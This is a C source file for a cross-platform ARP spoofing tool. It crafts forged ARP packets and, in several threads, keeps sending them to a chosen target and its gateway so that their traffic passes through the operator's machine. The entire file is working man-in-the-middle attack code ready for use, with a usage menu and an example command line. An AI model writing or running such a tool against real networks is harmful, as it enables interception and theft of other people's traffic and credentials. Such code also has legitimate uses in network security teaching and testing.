#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <stdint.h>
#include <stdatomic.h>

#ifdef _WIN32
#include <pcap.h>
#include <winsock2.h>
#include <windows.h>
#include <iphlpapi.h>
#include <process.h>
// ncessary for visual studio
#ifdef _MSC_VER
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "wpcap.lib")
#endif
#else
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netpacket/packet.h>
#include <netinet/ether.h>
#include <ifaddrs.h>
#include <pthread.h>
#endif

#ifndef IFNAMSIZ
#define IFNAMSIZ 16
#endif

#define ETH_HDR_LEN 14
#define ARP_HDR_LEN 28
#define PACKET_LEN 42

volatile sig_atomic_t shutdown_initialized = 0; // Flag for program shutdown
atomic_int packet_count; // Number of packets sent to the target

// handle KeyboardInterrupt
void handle_sigint(int sig) {
    if (sig == SIGINT){
        printf("\n[W] Interrupt signal received. Shutting down...\n");
        shutdown_initialized = 1;
    }
}

// Windows specific functions to open the network adapter for packet sending
#ifdef _WIN32
// Check if required npcap DLLs are present
int check_requirements() {
    const char* dll_paths[] = {
        "C:\\Windows\\System32\\wpcap.dll",
        "C:\\Windows\\System32\\packet.dll"
    };

    for (int i = 0; i < 2; i++) {
        if (GetFileAttributes(dll_paths[i]) == INVALID_FILE_ATTRIBUTES) {
            return 0;
            printf("[W] Required DLL not found: %s\n", dll_paths[i]);
        }
    }
    return 1;
}

// Get the controller name for the specified interface
char* get_controller_name(const char* interface_name) {
    IP_ADAPTER_ADDRESSES* adapter_addresses = NULL;
    ULONG out_buf_len = 0;
    DWORD ret;

    // Initial call to get buffer size
    ret = GetAdaptersAddresses(AF_UNSPEC, 0, NULL, adapter_addresses, &out_buf_len);
    if (ret == ERROR_BUFFER_OVERFLOW) {
        adapter_addresses = (IP_ADAPTER_ADDRESSES*)malloc(out_buf_len);
        if (!adapter_addresses) {
            fprintf(stderr, "Error allocating memory for adapter addresses\n");
            return NULL;
        }

        // Get the actual adapter information
        ret = GetAdaptersAddresses(AF_UNSPEC, 0, NULL, adapter_addresses, &out_buf_len);
    }

    if (ret != NO_ERROR) {
        fprintf(stderr, "Error getting adapter addresses: %lu\n", ret);
        free(adapter_addresses);
        return NULL;
    }

    char* controller_name = NULL;
    for (IP_ADAPTER_ADDRESSES* adapter = adapter_addresses; adapter; adapter = adapter->Next) {
        // Convert FriendlyName to char* for comparison
        char friendly_name[256];
        wcstombs(friendly_name, adapter->FriendlyName, sizeof(friendly_name));

        if (strcmp(friendly_name, interface_name) == 0) {
            // Convert Description to a dynamically allocated char*
            size_t len = wcslen(adapter->Description) + 1;
            controller_name = (char*)malloc(len);
            if (controller_name) {
                wcstombs(controller_name, adapter->Description, len);
            }
            break;
        }
    }

    free(adapter_addresses);

    if (!controller_name) {
        fprintf(stderr, "Interface not found: %s\n", interface_name);
    }

    return controller_name;
}

// Open the adapter for packet capture and sending
pcap_t* open_adapter(char* net_interface) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_if_t* alldevs;
    pcap_if_t* device;
    char* target_description = get_controller_name(net_interface);
    char device_name[PCAP_ERRBUF_SIZE] = {0};

    // Find all devices
    if (pcap_findalldevs(&alldevs, errbuf) == -1) {
        fprintf(stderr, "[E] Error finding devices: %s\n", errbuf);
        exit(EXIT_FAILURE);
    }

    for (device = alldevs; device != NULL; device = device->next) {
        // Match the device based on description
        if (device->description && strstr(device->description, target_description)) {
            strncpy(device_name, device->name, sizeof(device_name) - 1);
            break;
        }
    }

    if (strlen(device_name) == 0) {
        fprintf(stderr, "[E] Target device not found: %s\n", target_description);
        pcap_freealldevs(alldevs);
        exit(EXIT_FAILURE);
    }

    printf("[i] Selected device: %s\n", device_name);

    // Open the device
    pcap_t* handle = pcap_open_live(device_name, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "[E] Failed to open adapter: %s\n", errbuf);
        pcap_freealldevs(alldevs);
        exit(EXIT_FAILURE);
    }

    printf("[i] Adapter opened successfully!\n");

    pcap_freealldevs(alldevs);
    return handle;
}
#endif

void get_mac_address(char* net_interface, uint8_t* mac) {
#ifdef _WIN32
   IP_ADAPTER_ADDRESSES* adapter_addresses = NULL;
    ULONG out_buf_len = 0;
    DWORD ret;

    // Initial call to get buffer size
    ret = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, NULL, adapter_addresses, &out_buf_len);
    if (ret == ERROR_BUFFER_OVERFLOW) {
        adapter_addresses = (IP_ADAPTER_ADDRESSES*)malloc(out_buf_len);
        if (!adapter_addresses) {
            fprintf(stderr, "Error allocating memory for adapter addresses\n");
            exit(EXIT_FAILURE);
        }

        // Get the actual adapter information
        ret = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, NULL, adapter_addresses, &out_buf_len);
    }

    if (ret != NO_ERROR) {
        fprintf(stderr, "Error getting adapter addresses: %lu\n", ret);
        free(adapter_addresses);
        exit(EXIT_FAILURE);
    }

    // Iterate through the adapters
    int found = 0;
    for (IP_ADAPTER_ADDRESSES* adapter = adapter_addresses; adapter; adapter = adapter->Next) {
        char friendly_name[256];
        wcstombs(friendly_name, adapter->FriendlyName, sizeof(friendly_name));

        if (strcmp(friendly_name, net_interface) == 0) {
            // Copy the MAC address
            memcpy(mac, adapter->PhysicalAddress, 6);
            printf("[i] Host MAC address: %02x:%02x:%02x:%02x:%02x:%02x\n",
                   mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
            found = 1;
            break;
        }
    }

    free(adapter_addresses);

    if (!found) {
        fprintf(stderr, "Interface not found: %s\n", net_interface);
        exit(EXIT_FAILURE);
    }
#else
    printf("[i] Getting MAC address for interface %s\n", net_interface);
    char path[64];
    snprintf(path, sizeof(path), "/sys/class/net/%s/address", net_interface);
    FILE* fp = fopen(path, "r");
    if (!fp) {
        fprintf(stderr, "Error opening MAC address file %s\n", path);
        exit(EXIT_FAILURE);
    }
    fscanf(fp, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
           &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
    fprintf(stdout, "[i] Host MAC address: %02x:%02x:%02x:%02x:%02x:%02x\n",
            mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    fclose(fp);
#endif
}

#ifdef _WIN32
#else
// Necessary for raw socket creation
int get_interface_index(const char* net_interface) {
    struct ifaddrs *ifaddr, *ifa;
    int ifindex = -1;

    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        return -1;
    }

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL) {
            continue;
        }

        if (ifa->ifa_addr->sa_family == AF_PACKET && strcmp(ifa->ifa_name, net_interface) == 0) {
            ifindex = ((struct sockaddr_ll*)ifa->ifa_addr)->sll_ifindex;
            break;
        }
    }

    freeifaddrs(ifaddr);
    return ifindex;
}
#endif

#ifdef _WIN32
#else
int create_raw_socket() {
    int raw_socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (raw_socket < 0) {
        perror("Error: Failed to create socket.");
        return -1;
    }
    return raw_socket;

}
#endif

void cleanup() {
#ifdef _WIN32
    WSACleanup();
#endif
}

// Network headers
struct ethernet_header {
    uint8_t destination_mac[6];
    uint8_t source_mac[6];
    uint16_t ethernet_type;  // Protocol type (0x0806 for ARP)
};

struct arp_header {
    uint16_t hardware_type;  // Hardware type (Ethernet = 1)
    uint16_t protocol_type;  // Protocol type (IPv4 = 0x0800)
    uint8_t hardware_size;   // MAC address length (6)
    uint8_t protocol_size;   // IP address length (4)
    uint16_t opcode;         // Operation (1 for request, 2 for reply)
    uint8_t sender_mac[6];   // Sender hardware address
    uint8_t sender_ip[4];    // Sender IP address
    uint8_t target_mac[6];   // Target hardware address
    uint8_t target_ip[4];    // Target IP address
};

// Struct to handle thread data
struct thread_data {
    char net_interface[IFNAMSIZ];
    uint8_t sender_ip[4];
    uint8_t target_ip[4];
    uint8_t gateway_ip[4];
    uint8_t gateway_mac[6];
    int threads;
    uint8_t target_mac[6];
    uint8_t source_mac[6];
};

void craft_arp_broadcast_packet(uint8_t* packet, uint8_t* source_mac, uint8_t* sender_ip, uint8_t* target_ip) {
    printf("[i] Crafting ARP broadcast packet...\r");
    struct ethernet_header eth = {0};
    struct arp_header arp = {0};

    // Ethernet header
    memcpy(eth.destination_mac, "\xff\xff\xff\xff\xff\xff", 6);  // Broadcast
    memcpy(eth.source_mac, source_mac, 6);
    eth.ethernet_type = htons(0x0806);  // ARP protocol

    // ARP header
    arp.hardware_type = htons(1);       // Ethernet
    arp.protocol_type = htons(0x0800);  // IPv4
    arp.hardware_size = 6;              // MAC length
    arp.protocol_size = 4;              // IP length
    arp.opcode = htons(1);              // ARP Request
    memcpy(arp.sender_mac, source_mac, 6);
    memcpy(arp.sender_ip, sender_ip, 4);
    memset(arp.target_mac, 0, 6);       // Unknown target MAC
    memcpy(arp.target_ip, target_ip, 4);

    // Copy headers into the packet buffer
    memcpy(packet, &eth, sizeof(eth));
    memcpy(packet + sizeof(eth), &arp, sizeof(arp));
    printf("[i] Crafting ARP broadcast packet done\n");
}

void craft_arp_target_packet(uint8_t* packet, uint8_t* source_mac, uint8_t* target_mac, uint8_t* sender_ip, uint8_t* target_ip) {
    printf("[i] Crafting ARP target packet...\r");
    struct ethernet_header eth = {0};
    struct arp_header arp = {0};

    // Ethernet header
    memcpy(eth.destination_mac, target_mac, 6);  
    memcpy(eth.source_mac, source_mac, 6);
    eth.ethernet_type = htons(0x0806);  

    // ARP header
    arp.hardware_type = htons(1);       
    arp.protocol_type = htons(0x0800);  
    arp.hardware_size = 6;              
    arp.protocol_size = 4;              
    arp.opcode = htons(1);              
    memcpy(arp.sender_mac, source_mac, 6);
    memcpy(arp.sender_ip, sender_ip, 4);
    memcpy(arp.target_mac, target_mac, 6);     
    memcpy(arp.target_ip, target_ip, 4);

    memcpy(packet, &eth, sizeof(eth));
    memcpy(packet + sizeof(eth), &arp, sizeof(arp));
    printf("[i] Crafting ARP target packet done\n");
}

#ifdef _WIN32
void send_arp_request(pcap_t* handle, uint8_t* source_mac, uint8_t* sender_ip, uint8_t* target_ip) {
    uint8_t packet[PACKET_LEN];
    memset(packet, 0, PACKET_LEN);

    craft_arp_broadcast_packet(packet, source_mac, sender_ip, target_ip);

    // Verify handle is still valid
    if (handle == NULL) {
        fprintf(stderr, "[E] Handle is NULL after sending packet\n");
        exit(EXIT_FAILURE);
    }

    if (pcap_sendpacket(handle, packet, PACKET_LEN) != 0) {
        fprintf(stderr, "[E] Failed to send ARP request: %s\n", pcap_geterr(handle));
        fflush(stderr);
    } else {
        printf("[i] Sent ARP request to %d.%d.%d.%d\n", target_ip[0], target_ip[1], target_ip[2], target_ip[3]);
        fflush(stdout);
    }

    // Ensure the program is not terminating due to a signal
    if (shutdown_initialized) {
        printf("[W] Shutdown initialized, exiting...\n");
        pcap_close(handle);
        exit(EXIT_SUCCESS);
}
}
#else
void send_arp_request(int sockfd, char* net_interface, uint8_t* source_mac, uint8_t* sender_ip, uint8_t* target_ip) {
    uint8_t packet[PACKET_LEN];
    craft_arp_broadcast_packet(packet, source_mac, sender_ip, target_ip);

    struct sockaddr_ll addr = {0};
    addr.sll_family = AF_PACKET;
    addr.sll_protocol = htons(ETH_P_ARP);
    addr.sll_halen = ETH_ALEN;
    addr.sll_ifindex = if_nametoindex(net_interface);

    if (sendto(sockfd, packet, PACKET_LEN, 0, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("[E] Failed to send ARP request");
    } else {
        printf("[i] Sent ARP request to %d.%d.%d.%d\n", target_ip[0], target_ip[1], target_ip[2], target_ip[3]);
    }
}
#endif

#ifdef _WIN32
void receive_destination_mac(pcap_t* handle, uint8_t* sender_ip, uint8_t* host_mac, uint8_t* target_ip, uint8_t* sender_mac) {
    printf("[i] Waiting for ARP reply from %d.%d.%d.%d...\n", target_ip[0], target_ip[1], target_ip[2], target_ip[3]);
    struct pcap_pkthdr* header;
    const uint8_t* packet;
    int res;
    while (!shutdown_initialized) {
        send_arp_request(handle, host_mac, sender_ip, target_ip);
        res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) {
            // Timeout expired
            continue;
        } else if (res == -1) {
            fprintf(stderr, "[E] Failed to capture packet: %s\n", pcap_geterr(handle));
            continue;
        }
        printf("[i] Received ARP reply from %d.%d.%d.%d\n", packet[28], packet[29], packet[30], packet[31]);
        if (packet[12] == 0x08 && packet[13] == 0x06 && packet[20] == 0x00 && packet[21] == 0x02) {
            uint8_t* arp_sender_ip = (uint8_t*)(packet + 28);
            uint8_t* arp_sender_mac = (uint8_t*)(packet + 22);
            // Match the sender IP with the target IP
            if (memcmp(arp_sender_ip, target_ip, 4) == 0) {
                memcpy(sender_mac, arp_sender_mac, 6);
                break;
            }
        }

        if (shutdown_initialized) {
            pcap_close(handle);
            WSACleanup();
            exit(EXIT_SUCCESS);
        }
    }
}
#else
void receive_destination_mac(int sockfd, char* net_interface, uint8_t* sender_ip, uint8_t* host_mac, uint8_t* target_ip, uint8_t* sender_mac) {
    uint8_t buffer[65536];
    struct sockaddr_ll addr;
    socklen_t addrlen = sizeof(addr);
    while (!shutdown_initialized) {
        send_arp_request(sockfd, net_interface, host_mac, sender_ip, target_ip);
        ssize_t len = recvfrom(sockfd, buffer, sizeof(buffer), 0, (struct sockaddr*)&addr, &addrlen);
        if (len < 0) {
            perror("[E] Failed to receive packet");
            continue;
        }
        printf("[i] Received ARP reply from %d.%d.%d.%d\n", buffer[28], buffer[29], buffer[30], buffer[31]);        
        // Check if the packet is an ARP reply
        if (buffer[12] == 0x08 && buffer[13] == 0x06 && buffer[20] == 0x00 && buffer[21] == 0x02) {
            uint8_t* arp_sender_ip = buffer + 28;
            uint8_t* arp_sender_mac = buffer + 22;
            // Match the sender IP with the target IP
            if (memcmp(arp_sender_ip, target_ip, 4) == 0) {
                memcpy(sender_mac, arp_sender_mac, 6);
                break;
            }
        }
    }
    if (shutdown_initialized) {
        printf("[W] Shutting down...\n");
        exit(EXIT_SUCCESS);
    }
}
#endif

#ifdef _WIN32
int send_packet(uint8_t* source_mac, uint8_t* sender_ip, uint8_t* target_mac, uint8_t* target_ip, char* net_interface) {
    uint8_t packet[PACKET_LEN];
    craft_arp_target_packet(packet, source_mac, target_mac, sender_ip, target_ip);
    pcap_t* handle = open_adapter(net_interface);

   while (!shutdown_initialized) {
        printf("[i] Packets already sent: %d\r", atomic_load(&packet_count));
        fflush(stdout);
        if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0) {
            printf("[E] Error: Failed to send ARP packet to %d.%d.%d.%d\n", target_ip[0], target_ip[1], target_ip[2], target_ip[3]);
            fprintf(stderr, "Error: %s\n", pcap_geterr(handle));
            fflush(stdout);
            continue;
        }
        atomic_fetch_add(&packet_count, 1);
        Sleep(500);
    }

    if (shutdown_initialized) {
        pcap_close(handle);
        WSACleanup();
        exit(EXIT_SUCCESS);
    }
    return 0;
}
#else
int send_packet(uint8_t* source_mac, uint8_t* sender_ip, uint8_t* target_mac, uint8_t* target_ip, char* net_interface){
    uint8_t packet[PACKET_LEN];
    craft_arp_target_packet(packet, source_mac, target_mac, sender_ip, target_ip);

    int raw_socket = create_raw_socket();
    if (raw_socket < 0) {
        cleanup();
        return -1;
    }
    printf("[i] Raw socket created successfully\n");
    fflush(stdout);
    struct sockaddr_ll addr = {0};
    addr.sll_family = AF_PACKET;
    addr.sll_halen = ETH_ALEN;            
    memcpy(addr.sll_addr, target_mac, 6);
    int ifindex = get_interface_index(net_interface);
    if (ifindex < 0) {
        fprintf(stderr, "Error: Failed to get interface index for %s\n", net_interface);
        close(raw_socket);
        return -1;
    }
    addr.sll_ifindex = ifindex;

    while (!shutdown_initialized){
        printf("[i] Packets already sent: %d\r", atomic_load(&packet_count));
        fflush(stdout);
        if (sendto(raw_socket, packet, sizeof(packet), 0, (struct sockaddr*)&addr, sizeof(addr)) < 0){
            printf("[E] Error: Failed to send ARP packet to %d.%d.%d.%d\n", target_ip[0], target_ip[1], target_ip[2], target_ip[3]);
            perror("[E] Error: ");
            fflush(stdout);
            continue;
        }
        atomic_fetch_add(&packet_count, 1);
        sleep(0.5);
    }
    if (shutdown_initialized){
        close(raw_socket);
        cleanup();
        exit(EXIT_SUCCESS);
    }
    return 0;
}
#endif

#ifdef _WIN32
DWORD WINAPI run_target_thread(LPVOID args) {
    struct thread_data *data = (struct thread_data *)args;
    send_packet(data->source_mac, data->gateway_ip, data->target_mac, data->target_ip, data->net_interface);
    return 0;
}

DWORD WINAPI run_gateway_thread(LPVOID args) {
    struct thread_data *data = (struct thread_data *)args;
    send_packet(data->source_mac, data->target_ip, data->gateway_mac, data->gateway_ip, data->net_interface);
    return 0;
}
#else
void *run_target_thread(void *args){
    struct thread_data *data = (struct thread_data *)args;
    send_packet(data->source_mac, data->gateway_ip, data->target_mac, data->target_ip, data->net_interface);
    return NULL;
}

void *run_gateway_thread(void *args){
    struct thread_data *data = (struct thread_data *)args;
    send_packet(data->source_mac, data->target_ip, data->gateway_mac, data->gateway_ip, data->net_interface);
    return NULL;
}
#endif

void start_attack(struct thread_data* data){
    printf("[i] Starting ARP spoofing attack...\n");
    fflush(stdout);
#ifdef _WIN32
    HANDLE* target_threads = (HANDLE*)malloc(data->threads / 2 * sizeof(HANDLE));
    HANDLE* gateway_threads = (HANDLE*)malloc(data->threads / 2 * sizeof(HANDLE));

    // Create target threads
    for (int i = 0; i < data->threads / 2; i++) {
        target_threads[i] = CreateThread(NULL, 0, run_target_thread, data, 0, NULL);
        if (target_threads[i] == NULL) {
            fprintf(stderr, "Error creating target thread %d\n", i);
            exit(EXIT_FAILURE);
        }
    }

    // Create gateway threads
    for (int i = 0; i < data->threads / 2; i++) {
        gateway_threads[i] = CreateThread(NULL, 0, run_gateway_thread, data, 0, NULL);
        if (gateway_threads[i] == NULL) {
            fprintf(stderr, "Error creating gateway thread %d\n", i);
            exit(EXIT_FAILURE);
        }
    }

    // Wait for all threads to finish
    WaitForMultipleObjects(data->threads / 2, target_threads, TRUE, INFINITE);
    WaitForMultipleObjects(data->threads / 2, gateway_threads, TRUE, INFINITE);

    // Close thread handles
    for (int i = 0; i < data->threads / 2; i++) {
        CloseHandle(target_threads[i]);
        CloseHandle(gateway_threads[i]);
    }

    free(target_threads);
    free(gateway_threads);
#else
        pthread_t target_thread_id[data->threads];
        for (int i = 0; i < (data->threads / 2); i++){
            pthread_create(&target_thread_id[i], NULL, run_target_thread, data);
        }
        for (int i = (data->threads / 2); i < data->threads; i++){
            pthread_create(&target_thread_id[i], NULL, run_gateway_thread, data);
        }
        for (int i = 0; i < data->threads; i++) {
            pthread_join(target_thread_id[i], NULL);
        }
#endif
}


int check_mac(uint8_t* mac){
    for (int i = 0; i < 6; i++){
        if (mac[i] != 0){
            return 1;
        }
    }
    return 0;
}

void usage_menu(char* argv[]){
        printf("ARP spoofer version 1.0.0\n");
        printf("Usage: %s -i <interface> -sip <sender_ip> -tip <target_ip> -gip <gateway_ip>\n", argv[0]);
        printf("Positional: \n");
        printf("  -i <interface>    Interface to use\n");
        printf("  -sip <sender_ip>  IP address of the sender\n");
        printf("  -tip <target_ip>  IP address of the target\n");
        printf("  -gip <gateway_ip> IP address of the gateway\n");
        printf("Optional: \n");
        printf("  -th <threads>       Number of threads to use(default:2)\n");
        printf("  -tmac <target_mac>  MAC address of the target\n");
        printf("  -gmac <gateway_mac> MAC address of the gateway\n");
        printf("Example: %s -i eth0 -sip 129.23.123.12 -gip 129.23.123.1 -tip 129.23.123.43\n", argv[0]);
}

int parse_args(int argc, char* argv[], char* net_interface, uint8_t* sender_ip, uint8_t* target_ip, uint8_t* target_mac,uint8_t* gateway_ip, uint8_t* gateway_mac, int* threads) {
    printf("[i] Parsing arguments...\r");

    if (argc < 4) {
        usage_menu(argv);
        return -1;
    }

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-i") == 0 && i + 1 < argc) {
            strncpy(net_interface, argv[i + 1], IFNAMSIZ - 1);
            net_interface[IFNAMSIZ - 1] = '\0';
        } else if (strcmp(argv[i], "-sip") == 0 && i + 1 < argc) {
            if (inet_pton(AF_INET, argv[i + 1], sender_ip) != 1) {
                fprintf(stderr, "Error: Invalid sender IP address: %s\n", argv[i + 1]);
                return -1;
            }
        } else if (strcmp(argv[i], "-tip") == 0 && i + 1 < argc) {
            if (inet_pton(AF_INET, argv[i + 1], target_ip) != 1) {
                fprintf(stderr, "Error: Invalid target IP address: %s\n", argv[i + 1]);
                return -1;
            }
        } else if (strcmp(argv[i], "-gip") == 0 && i + 1 < argc) {
            if (inet_pton(AF_INET, argv[i + 1], gateway_ip) != 1) {
                fprintf(stderr, "Error: Invalid gateway IP address: %s\n", argv[i + 1]);
                return -1;
            }
        } else if (strcmp(argv[i], "-th") == 0 && i + 1 < argc) {
            *threads = atoi(argv[i + 1]);
            if (*threads == 0) {
                fprintf(stderr, "Error: Invalid thread count: %s\n", argv[i + 1]);
                return -1;
            }
        } else if (strcmp(argv[i], "-tmac") == 0 && i + 1 < argc) {
            sscanf(argv[i + 1], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &target_mac[0], &target_mac[1], &target_mac[2], &target_mac[3], &target_mac[4], &target_mac[5]);
        } else if (strcmp(argv[i], "-gmac") == 0 && i + 1 < argc) {
            sscanf(argv[i + 1], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &gateway_mac[0], &gateway_mac[1], &gateway_mac[2], &gateway_mac[3], &gateway_mac[4], &gateway_mac[5]);
        }
    }
    printf("[i] Parsing arguments done\n");
    printf("[i] ARP spoofer version 1.0.0\n");
    printf("----------------------------------\n");
    printf("[i] Interface: %s\n", net_interface);
    printf("[i] Sender IP: %d.%d.%d.%d\n", sender_ip[0], sender_ip[1], sender_ip[2], sender_ip[3]);
    printf("[i] Target IP: %d.%d.%d.%d\n", target_ip[0], target_ip[1], target_ip[2], target_ip[3]);
    printf("[i] Gateway IP: %d.%d.%d.%d\n", gateway_ip[0], gateway_ip[1], gateway_ip[2], gateway_ip[3]);
    printf("[i] Threads: %d\n", *threads);
    printf("[i] Target MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
           target_mac[0], target_mac[1], target_mac[2],
           target_mac[3], target_mac[4], target_mac[5]);
    printf("[i] Gateway MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
              gateway_mac[0], gateway_mac[1], gateway_mac[2],
              gateway_mac[3], gateway_mac[4], gateway_mac[5]);
    printf("----------------------------------\n");
    return 0;
}

int main(int argc, char* argv[]){
#ifdef _WIN32
    if (check_requirements()){
        printf("[i] All required DLLs found\n");
    }
#endif

    signal(SIGINT, handle_sigint);
    atomic_init(&packet_count, 0);

    char net_interface[IFNAMSIZ] = "eth0";    
    uint8_t sender_ip[4] = {0};
    uint8_t target_ip[4] = {0};
    uint8_t gateway_ip[4] = {0};
    uint8_t target_mac[6] = {0};
    uint8_t gateway_mac[6] = {0};
    uint8_t source_mac[6] = {0};
    int threads = 2;

    if (parse_args(argc, argv, net_interface, sender_ip, target_ip, target_mac, gateway_ip, gateway_mac, &threads) < 0) {
        return -1;
    }

    get_mac_address(net_interface, source_mac);

#ifdef _WIN32
    pcap_t* handle = open_adapter(net_interface);
#else
    int sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sockfd < 0){
        perror("Error: Failed to create socket.");
        return -1;
    }
#endif


    if (!check_mac(gateway_mac)){
    printf("[i] Getting MAC address for gateway %d.%d.%d.%d\n", gateway_ip[0], gateway_ip[1], gateway_ip[2], gateway_ip[3]);
#ifdef _WIN32
    receive_destination_mac(handle, sender_ip, source_mac, gateway_ip, gateway_mac);
#else
    receive_destination_mac(sockfd, net_interface, sender_ip, source_mac, gateway_ip, gateway_mac);
#endif    
    }

    if (!check_mac(target_mac)){
    printf("[i] Getting MAC address for target %d.%d.%d.%d\n", target_ip[0], target_ip[1], target_ip[2], target_ip[3]);
#ifdef _WIN32
    receive_destination_mac(handle, sender_ip, source_mac, target_ip, target_mac);
#else 
    receive_destination_mac(sockfd, net_interface, sender_ip, source_mac, target_ip, target_mac);
#endif
    }

    printf("[i] Target MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
           target_mac[0], target_mac[1], target_mac[2],
           target_mac[3], target_mac[4], target_mac[5]);
    printf("[i] Gateway MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
              gateway_mac[0], gateway_mac[1], gateway_mac[2],
              gateway_mac[3], gateway_mac[4], gateway_mac[5]);
    printf("----------------------------------\n");

    struct thread_data data;
    strncpy(data.net_interface, net_interface, IFNAMSIZ - 1);
    data.net_interface[IFNAMSIZ - 1] = '\0';
    memcpy(data.sender_ip, sender_ip, 4);
    memcpy(data.target_ip, target_ip, 4);
    memcpy(data.gateway_ip, gateway_ip, 4);
    data.threads = threads;
    memcpy(data.target_mac, target_mac, 6);
    memcpy(data.gateway_mac, gateway_mac, 6);
    memcpy(data.source_mac, source_mac, 6);

    start_attack(&data);

#ifdef _WIN32
    pcap_close(handle);
#else
    printf("[i] Cleaning up...\n");
    close(sockfd);
    cleanup();
#endif
    return 0;
}